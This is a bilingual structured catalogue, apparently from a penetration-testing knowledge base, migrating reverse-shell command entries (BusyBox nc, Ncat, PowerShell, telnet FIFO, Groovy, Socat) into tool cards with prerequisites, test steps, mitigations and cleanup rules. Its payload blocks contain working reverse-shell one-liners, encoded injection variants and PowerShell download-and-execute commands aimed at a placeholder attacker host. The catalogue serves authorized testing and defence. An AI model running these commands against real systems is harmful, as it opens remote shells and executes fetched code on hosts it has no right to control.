opsecTips.zh: OpenBSD Netcat FIFO 反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“命名管道、Shell 标准流和无 exec 选项的 OpenBSD nc 如何组合，以及临时文件清理要求”。
opsecTips.en: OpenBSD Netcat FIFO Reverse Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is how named pipes, shell standard streams, and OpenBSD nc without exec support combine, including temporary-file cleanup.

opsecTips.zh: OpenBSD Netcat FIFO 反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: OpenBSD Netcat FIFO Reverse Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: BusyBox nc Exec 反连命令

description.zh: 覆盖 BusyBox nc 的 -e、URL 加号编码和 IFS 分隔写法，属于嵌入式 Linux 工具命令，其中编码形式仅在特定注入层有意义。
description.en: Covers BusyBox nc -e, plus-encoded, and IFS-separated forms; these are embedded-Linux tool commands whose encoded forms matter only in specific injection layers.

overview.zh: BusyBox nc Exec 反连命令是工具命令或参考字典，不是独立 Payload。维护目标为BusyBox 构建是否包含 nc 与 -e，以及原始 Shell、表单加号解码和 IFS 展开三种输入层的差异。其适用前提为：目标运行含 nc applet 的 BusyBox，执行层与编码层已明确，并允许已授权的出站 TCP。迁移质量以busybox nc 帮助输出、最终解释器参数数组和受控连接能够对应到同一输入形式为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: BusyBox nc Exec Reverse Commands is tool command or reference data rather than an independent payload. It maintains whether the BusyBox build includes nc and -e and how raw shell, form plus decoding, and IFS expansion differ. Its prerequisites are the target runs a BusyBox build containing the nc applet, the execution and encoding layers are known, and outbound TCP is authorized. Migration quality requires BusyBox nc help output, the final interpreter argument vector, and a controlled connection correlate to the same input form; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标运行含 nc applet 的 BusyBox，执行层与编码层已明确，并允许已授权的出站 TCP，随后才可能用这些命令或特征审查“BusyBox 构建是否包含 nc 与 -e，以及原始 Shell、表单加号解码和 IFS 展开三种输入层的差异”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target runs a BusyBox build containing the nc applet, the execution and encoding layers are known, and outbound TCP is authorized, after which the commands or signatures may examine whether the BusyBox build includes nc and -e and how raw shell, form plus decoding, and IFS expansion differ. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 先查询 busybox nc --help，再分别在 Shell 与模拟表单解码入口测试原始、加号和 IFS 版本，记录哪些变体只是编码素材。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: inspect busybox nc help, then test raw, plus, and IFS forms separately in shell and simulated form-decoding inputs, recording which variants are only encoding material. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 nc-reverse 并标记 BusyBox 与输入层前提；固件最小化 applet、限制出站网络并避免将请求参数交给 Shell。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to nc-reverse with BusyBox and input-layer prerequisites, minimize firmware applets, restrict egress, and avoid passing request parameters to a shell. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“BusyBox nc Exec 反连命令”来源与角色

description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the target runs a BusyBox build containing the nc applet, the execution and encoding layers are known, and outbound TCP is authorized.

title.zh: 逐行标注“BusyBox nc 反连”适用性
title.en: Tag BusyBox nc Reverse Connections applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“busybox nc 帮助输出、最终解释器参数数组和受控连接能够对应到同一输入形式”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: BusyBox nc help output, the final interpreter argument vector, and a controlled connection correlate to the same input form.

title.zh: 迁移“BusyBox nc Exec 反连命令”原始命令
title.en: Migrate original BusyBox nc Exec Reverse Commands commands

description.zh: 测试步骤为：先查询 busybox nc --help，再分别在 Shell 与模拟表单解码入口测试原始、加号和 IFS 版本，记录哪些变体只是编码素材。完整保留原命令并只在一次性环境用固定标记验证。
description.en: inspect busybox nc help, then test raw, plus, and IFS forms separately in shell and simulated form-decoding inputs, recording which variants are only encoding material. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
busybox nc ATTACKER_IP PORT -e sh
busybox nc ATTACKER_IP PORT -e /bin/sh
busybox nc ATTACKER_IP PORT -e bash
busybox nc ATTACKER_IP PORT -e /bin/bash
busybox+nc+ATTACKER_IP+PORT+-e+sh
busybox${IFS}nc${IFS}ATTACKER_IP${IFS}PORT${IFS}-e${IFS}sh

name.zh: Ncat Exec 与 UDP FIFO 命令
name.en: Ncat Exec and UDP FIFO Commands

description.zh: 包含 Nmap Ncat 的 -e TCP 变体与 mkfifo UDP 组合，属于 Ncat 工具命令，应按传输协议和临时文件副作用分组。
description.en: Includes Nmap Ncat -e TCP variants and a mkfifo UDP composition; these are Ncat tool commands that should be grouped by transport and temporary-file side effects.

overview.zh: Ncat Exec 与 UDP FIFO 命令是工具命令或参考字典，不是独立 Payload。维护目标为Ncat exec 模式与 UDP FIFO 模式在传输可靠性、Shell 路径和清理要求上的区别。其适用前提为：目标安装 Nmap Ncat、允许对应 TCP 或 UDP 出站流量，并已在授权范围内取得命令执行。迁移质量以ncat 版本、所选协议、进程树、受控监听记录和 FIFO 清理状态全部可核对为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Ncat Exec and UDP FIFO Commands is tool command or reference data rather than an independent payload. It maintains differences between Ncat exec and UDP FIFO modes in transport reliability, shell paths, and cleanup requirements. Its prerequisites are the target has Nmap Ncat, permits the relevant outbound TCP or UDP traffic, and command execution is already authorized. Migration quality requires Ncat version, selected transport, process tree, controlled listener record, and FIFO cleanup state are all verifiable; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标安装 Nmap Ncat、允许对应 TCP 或 UDP 出站流量，并已在授权范围内取得命令执行，随后才可能用这些命令或特征审查“Ncat exec 模式与 UDP FIFO 模式在传输可靠性、Shell 路径和清理要求上的区别”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。

exploitation.zh: 分别测试两个 TCP exec 行和一个 UDP FIFO 行，使用固定标记而非交互命令，并在 UDP 测试后确认临时管道删除。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: test the two TCP exec lines and one UDP FIFO line separately with a fixed marker rather than interactive commands, and verify pipe removal after the UDP test. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 nc-reverse 并按 TCP、UDP 与 FIFO 标签管理；主机限制 Ncat 执行权限和非业务出口流量。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to nc-reverse with TCP, UDP, and FIFO tags, and restrict Ncat execution privileges plus non-business egress. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“ncat 版本、所选协议、进程树、受控监听记录和 FIFO 清理状态全部可核对”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: Ncat version, selected transport, process tree, controlled listener record, and FIFO cleanup state are all verifiable.

title.zh: 迁移“Ncat Exec 与 UDP FIFO 命令”原始命令
title.en: Migrate original Ncat Exec and UDP FIFO Commands commands

description.zh: 测试步骤为：分别测试两个 TCP exec 行和一个 UDP FIFO 行，使用固定标记而非交互命令，并在 UDP 测试后确认临时管道删除。完整保留原命令并只在一次性环境用固定标记验证。
description.en: test the two TCP exec lines and one UDP FIFO line separately with a fixed marker rather than interactive commands, and verify pipe removal after the UDP test. Preserve the original command in full and validate only with fixed markers in a disposable environment.

ncat ATTACKER_IP PORT -e /bin/sh
ncat ATTACKER_IP PORT -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u ATTACKER_IP PORT >/tmp/f

name.zh: PowerShell TCP 与下载执行命令

description.zh: 混合 TCPClient 循环、DownloadString 与 Powercat 下载执行方式，属于 PowerShell 反连工具参考，并涉及明文 HTTP 与 IEX 高风险行为。
description.en: Mixes TCPClient loops, DownloadString, and Powercat download-execution forms; these are PowerShell reverse-connection tool references involving plaintext HTTP and high-risk IEX behavior.

overview.zh: PowerShell TCP 与下载执行命令是工具命令或参考字典，不是独立 Payload。维护目标为原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异。其适用前提为：PowerShell 可执行、脚本语言模式和 AMSI 策略允许相关调用，并且出站 TCP/HTTP 已获授权。迁移质量以PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: PowerShell TCP and Download-Execution Commands is tool command or reference data rather than an independent payload. It maintains network, process, and script-logging differences between native TCPClient sessions and IEX or DownloadString execution. Its prerequisites are PowerShell is executable, language mode and AMSI policy permit the calls, and outbound TCP or HTTP is authorized. Migration quality requires PowerShell event logs, script block or command line, destination connection, and test-script hash correlate; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于PowerShell 可执行、脚本语言模式和 AMSI 策略允许相关调用，并且出站 TCP/HTTP 已获授权，随后才可能用这些命令或特征审查“原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on PowerShell is executable, language mode and AMSI policy permit the calls, and outbound TCP or HTTP is authorized, after which the commands or signatures may examine network, process, and script-logging differences between native TCPClient sessions and IEX or DownloadString execution. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在一次性 Windows 虚拟机中先解析命令并替换为本地固定脚本，分别测试 TCPClient、DownloadString 与 Powercat 路径，禁止访问公共地址。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: use a disposable Windows VM, replace downloads with a fixed local script, and test TCPClient, DownloadString, and Powercat paths separately without public destinations. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 powershell-reverse 并按原生连接和下载执行分组；生产启用脚本块日志、AMSI、受限语言模式和出口允许列表。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to powershell-reverse grouped by native connection versus download execution, and enable script-block logging, AMSI, constrained language, and egress allowlists in production. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“PowerShell TCP 与下载执行命令”来源与角色
title.en: Verify PowerShell TCP and Download-Execution Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“PowerShell 可执行、脚本语言模式和 AMSI 策略允许相关调用，并且出站 TCP/HTTP 已获授权”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: PowerShell is executable, language mode and AMSI policy permit the calls, and outbound TCP or HTTP is authorized.

title.zh: 逐行标注“PowerShell 反连与下载执行”适用性
title.en: Tag PowerShell Reverse and Download Execution applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: PowerShell event logs, script block or command line, destination connection, and test-script hash correlate.

title.zh: 迁移“PowerShell TCP 与下载执行命令”原始命令
title.en: Migrate original PowerShell TCP and Download-Execution Commands commands

description.zh: 测试步骤为：在一次性 Windows 虚拟机中先解析命令并替换为本地固定脚本，分别测试 TCPClient、DownloadString 与 Powercat 路径，禁止访问公共地址。完整保留原命令并只在一次性环境用固定标记验证。
description.en: use a disposable Windows VM, replace downloads with a fixed local script, and test TCPClient, DownloadString, and Powercat paths separately without public destinations. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/reverse.ps1')
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1');powercat -c ATTACKER_IP -p PORT -e cmd"

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 powershell-reverse 并按原生连接和下载执行分组；生产启用脚本块日志、AMSI、受限语言模式和出口允许列表”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to powershell-reverse grouped by native connection versus download execution, and enable script-block logging, AMSI, constrained language, and egress allowlists in production and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: PowerShell TCP 与下载执行命令是纯工具命令或参考字典，应迁入 powershell-reverse，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“PowerShell TCP 与下载执行命令”是纯命令/字典，目标 Tool powershell-reverse 均存在，并记录来源、版本及前提：PowerShell 可执行、脚本语言模式和 AMSI 策略允许相关调用，并且出站 TCP/HTTP 已获授权。
prerequisites.en: The PowerShell TCP and Download-Execution Commands record is command or dictionary data, destination tools powershell-reverse exist, and provenance, version, and prerequisites are recorded: PowerShell is executable, language mode and AMSI policy permit the calls, and outbound TCP or HTTP is authorized.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using PowerShell event logs, script block or command line, destination connection, and test-script hash correlate for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和PowerShell 事件日志、脚本块或命令行、目标连接和测试脚本哈希能够关联保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and PowerShell event logs, script block or command line, destination connection, and test-script hash correlate; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to network, process, and script-logging differences between native TCPClient sessions and IEX or DownloadString execution.

opsecTips.zh: PowerShell TCP 与下载执行命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“原生 TCPClient 会话与 IEX/DownloadString 下载执行的网络、进程和脚本日志差异”。
opsecTips.en: PowerShell TCP and Download-Execution Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is network, process, and script-logging differences between native TCPClient sessions and IEX or DownloadString execution.

opsecTips.zh: PowerShell TCP 与下载执行命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PowerShell TCP and Download-Execution Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Telnet FIFO Shell 管道命令

description.zh: 通过 telnet、命名管道和本地 Shell 组合输入输出的反连流程，属于 Linux 命令工具参考，且部分行存在重定向可移植性问题。
description.en: Reverse pipelines combining telnet, named pipes, and local shells; these are Linux command references with portability issues in some redirections.

overview.zh: Telnet FIFO Shell 管道命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 telnet 客户端、mknod/mkfifo 和 Shell 重定向语法能否形成稳定双向管道。其适用前提为：目标安装 telnet 和管道工具、临时目录可写、出站连接已获授权且执行 Shell 明确在测试范围。迁移质量以随机管道路径、telnet 连接、Shell 子进程与清理记录形成一条完整实验记录为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Telnet FIFO Shell Pipeline Commands is tool command or reference data rather than an independent payload. It maintains whether different telnet clients, mknod or mkfifo, and shell redirection syntax form a stable bidirectional pipeline. Its prerequisites are the target has telnet and pipe tools, writable temporary storage, authorized egress, and explicit scope for shell execution. Migration quality requires the randomized pipe path, telnet connection, shell child process, and cleanup record form one complete experiment; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标安装 telnet 和管道工具、临时目录可写、出站连接已获授权且执行 Shell 明确在测试范围，随后才可能用这些命令或特征审查“不同 telnet 客户端、mknod/mkfifo 和 Shell 重定向语法能否形成稳定双向管道”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the target has telnet and pipe tools, writable temporary storage, authorized egress, and explicit scope for shell execution, after which the commands or signatures may examine whether different telnet clients, mknod or mkfifo, and shell redirection syntax form a stable bidirectional pipeline. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 逐行在隔离容器验证解析，使用随机 FIFO 与固定 echo，记录第一个疑似缺少重定向符的变体是否实际可用，并完成清理。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: parse and test each line in isolation with a random FIFO and fixed echo marker, record whether the first apparently malformed redirection works, and complete cleanup. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 linux-command-tricks 并标记不可移植或失效语法；生产移除 telnet 客户端、限制临时目录与非业务出口并监控管道到 Shell 的进程链。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。

Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

attackChain.payload:
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKER_IP PORT 0/tmp/p
telnet ATTACKER_IP 80 | /bin/bash | telnet ATTACKER_IP PORT

TF=$(mktemp -u);mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF | sh 1>$TF

name.zh: Groovy 进程执行与反连命令
name.en: Groovy Process Execution and Reverse Commands

description.zh: 覆盖 Runtime.exec、String.execute、Netcat 与 PowerShell 的 Groovy 进程调用片段，属于 Groovy 反连工具命令并混有 Windows 路径转义疑点。
description.en: Covers Groovy Runtime.exec and String.execute snippets invoking Netcat or PowerShell; these are Groovy reverse-command references with questionable Windows path escaping.

overview.zh: Groovy 进程执行与反连命令是工具命令或参考字典，不是独立 Payload。维护目标为Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为。其适用前提为：目标允许执行 Groovy 脚本、存在对应 Shell 或外部工具，并已批准出站连接与子进程测试。迁移质量以Groovy 版本、最终参数数组、子进程退出状态和受控连接能够对应，错误转义行被明确标记为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。

Its prerequisites are the target executes Groovy scripts, provides the referenced shell or external tool, and authorizes outbound connection and child-process testing. Migration quality requires Groovy version, final argument vector, child exit status, and controlled connection correlate, with malformed escaping explicitly tagged; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于目标允许执行 Groovy 脚本、存在对应 Shell 或外部工具，并已批准出站连接与子进程测试，随后才可能用这些命令或特征审查“Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 在 Linux 与 Windows 一次性 Groovy 环境逐块执行，不把多行脚本误作独立命令，并使用固定 echo 与本地测试脚本替代外部下载。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: execute blocks in disposable Linux and Windows Groovy environments, do not treat multi-line scripts as separate commands, and replace external downloads with fixed local scripts and echo markers. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 groovy-reverse 并按操作系统和脚本块分组；生产禁用不可信 Groovy 求值、限制子进程与出口并保留进程审计。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to groovy-reverse grouped by operating system and script block, and disable untrusted Groovy evaluation, restrict child processes and egress, and retain process auditing. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Groovy 进程执行与反连命令”来源与角色
title.en: Verify Groovy Process Execution and Reverse Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“目标允许执行 Groovy 脚本、存在对应 Shell 或外部工具，并已批准出站连接与子进程测试”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the target executes Groovy scripts, provides the referenced shell or external tool, and authorizes outbound connection and child-process testing.

title.zh: 逐行标注“Groovy 进程与反连”适用性
title.en: Tag Groovy Processes and Reverse Connections applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“Groovy 版本、最终参数数组、子进程退出状态和受控连接能够对应，错误转义行被明确标记”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: Groovy version, final argument vector, child exit status, and controlled connection correlate, with malformed escaping explicitly tagged.

title.zh: 迁移“Groovy 进程执行与反连命令”原始命令
title.en: Migrate original Groovy Process Execution and Reverse Commands commands

description.zh: 测试步骤为：在 Linux 与 Windows 一次性 Groovy 环境逐块执行，不把多行脚本误作独立命令，并使用固定 echo 与本地测试脚本替代外部下载。完整保留原命令并只在一次性环境用固定标记验证。
description.en: execute blocks in disposable Linux and Windows Groovy environments, do not treat multi-line scripts as separate commands, and replace external downloads with fixed local scripts and echo markers. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
cmd = "nc -e /bin/sh ATTACKER_IP PORT"
cmd.execute().text
"nc -e /bin/sh ATTACKER_IP PORT".execute().text
cmd = "\\ATTACKER_IP\a\nc.exe -e cmd ATTACKER_IP PORT"
println "\\ATTACKER_IP\a\nc.exe -e cmd ATTACKER_IP PORT" .execute().text
command = "powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/reverse.ps1')"
println(command.execute().text)

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 groovy-reverse 并按操作系统和脚本块分组；生产禁用不可信 Groovy 求值、限制子进程与出口并保留进程审计”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to groovy-reverse grouped by operating system and script block, and disable untrusted Groovy evaluation, restrict child processes and egress, and retain process auditing and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: Groovy 进程执行与反连命令是纯工具命令或参考字典，应迁入 groovy-reverse，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“Groovy 进程执行与反连命令”是纯命令/字典，目标 Tool groovy-reverse 均存在，并记录来源、版本及前提：目标允许执行 Groovy 脚本、存在对应 Shell 或外部工具，并已批准出站连接与子进程测试。
prerequisites.en: The Groovy Process Execution and Reverse Commands record is command or dictionary data, destination tools groovy-reverse exist, and provenance, version, and prerequisites are recorded: the target executes Groovy scripts, provides the referenced shell or external tool, and authorizes outbound connection and child-process testing.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用Groovy 版本、最终参数数组、子进程退出状态和受控连接能够对应，错误转义行被明确标记检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using Groovy version, final argument vector, child exit status, and controlled connection correlate, with malformed escaping explicitly tagged for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和Groovy 版本、最终参数数组、子进程退出状态和受控连接能够对应，错误转义行被明确标记保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and Groovy version, final argument vector, child exit status, and controlled connection correlate, with malformed escaping explicitly tagged; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to argument splitting, escaping, and process-wait behavior across Groovy Runtime.exec, String.execute, and cross-platform command strings.

opsecTips.zh: Groovy 进程执行与反连命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“Groovy Runtime.exec、String.execute 和跨平台命令字符串的参数拆分、转义及进程等待行为”。
opsecTips.en: Groovy Process Execution and Reverse Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is argument splitting, escaping, and process-wait behavior across Groovy Runtime.exec, String.execute, and cross-platform command strings.

opsecTips.zh: Groovy 进程执行与反连命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Groovy Process Execution and Reverse Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Socat 反连与 PTY 命令
name.en: Socat Reverse Connection and PTY Commands

description.zh: 包含 TCP EXEC、带 PTY 的交互 Shell、本地 raw TTY 监听与反连形式，属于 Socat 工具工作流，不是 WebShell Payload。
description.en: Includes TCP EXEC, PTY-backed interactive shells, a local raw-TTY listener, and reverse forms; this is a Socat tool workflow rather than a webshell payload.

overview.zh: Socat 反连与 PTY 命令是工具命令或参考字典，不是独立 Payload。维护目标为Socat 地址类型、EXEC 选项、PTY 标志与监听端和连接端角色之间的区别。其适用前提为：两端安装 Socat、选定端口获准、目标已具备命令执行且 PTY 与终端信号行为在测试范围。迁移质量以Socat 调试输出、地址角色、子进程树、TTY 状态和受控连接均与所选行一致为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
